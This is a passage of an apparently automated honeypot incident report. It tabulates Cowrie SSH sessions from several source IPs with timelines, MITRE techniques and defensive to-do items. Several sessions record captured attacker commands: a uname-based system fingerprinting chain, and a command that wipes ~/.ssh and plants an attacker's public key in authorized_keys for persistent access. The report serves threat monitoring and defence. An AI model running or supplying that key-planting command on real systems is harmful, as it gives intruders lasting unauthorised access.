| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:06:13` | `cowrie.session.connect` |
| `2026-08-29 11:06:13` | `cowrie.client.version` |
| `2026-08-29 11:06:13` | `cowrie.client.kex` |
| `2026-08-29 11:06:14` | `cowrie.login.success` |
| `2026-08-29 11:06:15` | `cowrie.session.params` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:15` | `cowrie.command.success` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:15` | `cowrie.command.input` |
| `2026-08-29 11:06:16` | `cowrie.log.closed` |
| `2026-08-29 11:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ffc60a75af1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:06 |
| **Last Seen** | 2026-08-29 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:06:36` | `cowrie.session.connect` |
| `2026-08-29 11:06:36` | `cowrie.client.version` |
| `2026-08-29 11:06:37` | `cowrie.client.kex` |
| `2026-08-29 11:06:37` | `cowrie.login.success` |
| `2026-08-29 11:06:38` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:06:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:06:38` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e419519a2e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:07 |
| **Last Seen** | 2026-08-29 11:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:07:24` | `cowrie.session.connect` |
| `2026-08-29 11:07:24` | `cowrie.client.version` |
| `2026-08-29 11:07:24` | `cowrie.client.kex` |
| `2026-08-29 11:07:25` | `cowrie.login.success` |
| `2026-08-29 11:07:26` | `cowrie.session.params` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.command.success` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.command.input` |
| `2026-08-29 11:07:26` | `cowrie.log.closed` |
| `2026-08-29 11:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99b8abb22e0f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:07 |
| **Last Seen** | 2026-08-29 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:07:36` | `cowrie.session.connect` |
| `2026-08-29 11:07:36` | `cowrie.client.version` |
| `2026-08-29 11:07:36` | `cowrie.client.kex` |
| `2026-08-29 11:07:37` | `cowrie.login.success` |
| `2026-08-29 11:07:37` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:07:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:07:37` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09bd9a02eab2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:08 |
| **Last Seen** | 2026-08-29 11:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:08:34` | `cowrie.session.connect` |
| `2026-08-29 11:08:34` | `cowrie.client.version` |
| `2026-08-29 11:08:34` | `cowrie.client.kex` |
| `2026-08-29 11:08:35` | `cowrie.login.success` |
| `2026-08-29 11:08:36` | `cowrie.session.params` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.command.success` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.command.input` |
| `2026-08-29 11:08:36` | `cowrie.log.closed` |
| `2026-08-29 11:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465a76be591d

| Field | Detail |
|---|---|
| **Source IP** | `154.57.216[.]142` |
| **First Seen** | 2026-08-29 11:09 |
| **Last Seen** | 2026-08-29 11:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:09:12` | `cowrie.session.connect` |
| `2026-08-29 11:09:12` | `cowrie.client.version` |
| `2026-08-29 11:09:13` | `cowrie.client.kex` |
| `2026-08-29 11:09:13` | `cowrie.login.success` |
| `2026-08-29 11:09:14` | `cowrie.session.params` |
| `2026-08-29 11:09:14` | `cowrie.command.input` |
| `2026-08-29 11:09:14` | `cowrie.command.failed` |
| `2026-08-29 11:09:15` | `cowrie.log.closed` |
| `2026-08-29 11:09:16` | `cowrie.session.params` |
| `2026-08-29 11:09:16` | `cowrie.command.input` |
| `2026-08-29 11:09:16` | `cowrie.session.file_download` |
| `2026-08-29 11:09:16` | `cowrie.log.closed` |
| `2026-08-29 11:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.57.216[.]142` to AbuseIPDB if not already reported
- [ ] Block `154.57.216[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5afda5aef6e

| Field | Detail |
|---|---|
| **Source IP** | `154.57.216[.]142` |
| **First Seen** | 2026-08-29 11:09 |
| **Last Seen** | 2026-08-29 11:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:09:16` | `cowrie.session.connect` |
| `2026-08-29 11:09:16` | `cowrie.client.version` |
| `2026-08-29 11:09:16` | `cowrie.client.kex` |
| `2026-08-29 11:09:17` | `cowrie.login.success` |
| `2026-08-29 11:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.57.216[.]142` to AbuseIPDB if not already reported
- [ ] Block `154.57.216[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0067013bbdc1

| Field | Detail |
|---|---|
| **Source IP** | `154.57.216[.]142` |
| **First Seen** | 2026-08-29 11:09 |
| **Last Seen** | 2026-08-29 11:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:09:17` | `cowrie.session.connect` |
| `2026-08-29 11:09:17` | `cowrie.client.version` |
| `2026-08-29 11:09:18` | `cowrie.client.kex` |
| `2026-08-29 11:09:18` | `cowrie.login.success` |
| `2026-08-29 11:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.57.216[.]142` to AbuseIPDB if not already reported
- [ ] Block `154.57.216[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d67e33cfa106

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:09 |
| **Last Seen** | 2026-08-29 11:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:09:44` | `cowrie.session.connect` |
| `2026-08-29 11:09:44` | `cowrie.client.version` |
| `2026-08-29 11:09:44` | `cowrie.client.kex` |
| `2026-08-29 11:09:45` | `cowrie.login.success` |
| `2026-08-29 11:09:46` | `cowrie.session.params` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.command.success` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.command.input` |
| `2026-08-29 11:09:46` | `cowrie.log.closed` |
| `2026-08-29 11:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0954c5a0b029

| Field | Detail |
|---|---|
| **Source IP** | `78.109.200[.]147` |
| **First Seen** | 2026-08-29 11:09 |
| **Last Seen** | 2026-08-29 11:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:09:58` | `cowrie.session.connect` |
| `2026-08-29 11:09:58` | `cowrie.client.version` |
| `2026-08-29 11:09:58` | `cowrie.client.kex` |
| `2026-08-29 11:09:58` | `cowrie.login.success` |
| `2026-08-29 11:09:59` | `cowrie.session.params` |
| `2026-08-29 11:09:59` | `cowrie.command.input` |
| `2026-08-29 11:09:59` | `cowrie.command.failed` |
| `2026-08-29 11:10:00` | `cowrie.log.closed` |
| `2026-08-29 11:10:00` | `cowrie.session.params` |
| `2026-08-29 11:10:00` | `cowrie.command.input` |
| `2026-08-29 11:10:01` | `cowrie.session.file_download` |
| `2026-08-29 11:10:01` | `cowrie.log.closed` |
| `2026-08-29 11:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.109.200[.]147` to AbuseIPDB if not already reported
- [ ] Block `78.109.200[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2839f5f85eb

| Field | Detail |
|---|---|
| **Source IP** | `78.109.200[.]147` |
| **First Seen** | 2026-08-29 11:10 |
| **Last Seen** | 2026-08-29 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:10:01` | `cowrie.session.connect` |
| `2026-08-29 11:10:01` | `cowrie.client.version` |
| `2026-08-29 11:10:01` | `cowrie.client.kex` |
| `2026-08-29 11:10:02` | `cowrie.login.success` |
| `2026-08-29 11:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.109.200[.]147` to AbuseIPDB if not already reported
- [ ] Block `78.109.200[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9552e8fc497a

| Field | Detail |
|---|---|
| **Source IP** | `78.109.200[.]147` |
| **First Seen** | 2026-08-29 11:10 |
| **Last Seen** | 2026-08-29 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:10:02` | `cowrie.session.connect` |
| `2026-08-29 11:10:02` | `cowrie.client.version` |
| `2026-08-29 11:10:02` | `cowrie.client.kex` |
| `2026-08-29 11:10:03` | `cowrie.login.success` |
| `2026-08-29 11:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.109.200[.]147` to AbuseIPDB if not already reported
- [ ] Block `78.109.200[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ac1454c5631

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:10 |
| **Last Seen** | 2026-08-29 11:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:10:52` | `cowrie.session.connect` |
| `2026-08-29 11:10:52` | `cowrie.client.version` |
| `2026-08-29 11:10:52` | `cowrie.client.kex` |
| `2026-08-29 11:10:53` | `cowrie.login.success` |
| `2026-08-29 11:10:54` | `cowrie.session.params` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.command.success` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.command.input` |
| `2026-08-29 11:10:54` | `cowrie.log.closed` |
| `2026-08-29 11:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a1e9e27d4b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:12 |
| **Last Seen** | 2026-08-29 11:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:12:00` | `cowrie.session.connect` |
| `2026-08-29 11:12:00` | `cowrie.client.version` |
| `2026-08-29 11:12:00` | `cowrie.client.kex` |
| `2026-08-29 11:12:02` | `cowrie.login.success` |
| `2026-08-29 11:12:03` | `cowrie.session.params` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.command.success` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.command.input` |
| `2026-08-29 11:12:03` | `cowrie.log.closed` |
| `2026-08-29 11:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc64e23fff83

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:13 |
| **Last Seen** | 2026-08-29 11:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:13:10` | `cowrie.session.connect` |
| `2026-08-29 11:13:10` | `cowrie.client.version` |
| `2026-08-29 11:13:10` | `cowrie.client.kex` |
| `2026-08-29 11:13:11` | `cowrie.login.success` |
| `2026-08-29 11:13:11` | `cowrie.session.params` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:11` | `cowrie.command.success` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:11` | `cowrie.command.input` |
| `2026-08-29 11:13:12` | `cowrie.log.closed` |
| `2026-08-29 11:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3afd8410637

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:14 |
| **Last Seen** | 2026-08-29 11:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:14:18` | `cowrie.session.connect` |
| `2026-08-29 11:14:18` | `cowrie.client.version` |
| `2026-08-29 11:14:18` | `cowrie.client.kex` |
| `2026-08-29 11:14:19` | `cowrie.login.success` |
